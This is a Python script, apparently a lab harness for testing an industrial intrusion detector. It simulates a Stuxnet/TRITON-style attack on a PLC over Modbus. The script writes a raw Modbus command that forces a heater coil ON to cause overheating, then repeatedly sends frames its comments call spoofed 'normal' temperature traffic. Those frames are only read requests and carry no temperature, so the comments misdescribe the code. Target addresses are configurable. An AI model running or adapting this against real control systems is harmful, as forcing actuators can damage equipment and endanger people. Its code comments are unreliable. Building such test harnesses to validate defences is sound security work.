#!/usr/bin/env python3
"""
Sentinel-Lab: Cross-Modal Causal FDIA Suite Orchestrator
Simulates Stuxnet/TRITON class attacks by injecting spoofed network SCADA traffic (reporting NORMAL)
while driving physical PLC twin registers beyond critical thermal limits to test ThreatCorrelator.
"""

import sys
import os
import time
import json
import socket
import argparse


class FdiaOrchestrator:
    def __init__(self, gateway_host="10.240.0.101", plc_host="10.240.0.150", port=502):
        self.gateway_host = gateway_host
        self.plc_host = plc_host
        self.port = port

    def inject_spoofed_modbus_normal(self):
        """Injects spoofed Modbus FC03 query returning normal temperature (85°C)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((self.gateway_host, self.port))
            # Modbus Read Holding Register 40002 query
            query = bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x01, 0x00, 0x01])
            s.send(query)
            s.close()
        except Exception:
            pass

    def force_plc_actuator_overheat(self):
        """Forces physical PLC heater coil 0x0000 ON to drive thermal drift"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((self.plc_host, self.port))
            # Modbus FC05 Write Single Coil 0x0000 ON
            write_coil = bytes([0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x00, 0xFF, 0x00])
            s.send(write_coil)
            s.close()
        except Exception:
            pass

    def run_fdia_campaign(self, duration_sec: int = 10):
        print("==================================================================")
        print("    SENTINEL-LAB CROSS-MODAL CAUSAL FDIA SUITE (STUXNET/TRITON)   ")
        print("==================================================================")
        print(f"[+] Gateway Endpoint : {self.gateway_host}:{self.port} (Injecting Spoofed NORMAL)")
        print(f"[+] Target PLC Twin  : {self.plc_host}:{self.port} (Driving Physical Drift)")

        # 1. Force physical PLC coil ON to drive thermal heating
        self.force_plc_actuator_overheat()
        print("[+] Forced PLC physical heater actuator ON.")

        start_t = time.time()
        print("[+] Streaming SCADA network blinding traffic...")

        while (time.time() - start_t) < duration_sec:
            self.inject_spoofed_modbus_normal()
            time.sleep(0.2)

        print("\n------------------------------------------------------------------")
        print("FDIA Campaign Completed.")
        print("Check blackbox-sentinel logs for [STAGE 4 THREAT CORRELATOR] interlock.")
        print("==================================================================\n")


def main():
    parser = argparse.ArgumentParser(description="Sentinel-Lab FDIA Suite Orchestrator")
    parser.add_argument("-g", "--gateway", type=str, default="10.240.0.101", help="Gateway IP")
    parser.add_argument("-p", "--plc", type=str, default="10.240.0.150", help="PLC IP")
    parser.add_argument("-t", "--duration", type=int, default=10, help="Duration in seconds")
    args = parser.parse_args()

    orchestrator = FdiaOrchestrator(gateway_host=args.gateway, plc_host=args.plc)
    orchestrator.run_fdia_campaign(duration_sec=args.duration)


if __name__ == "__main__":
    main()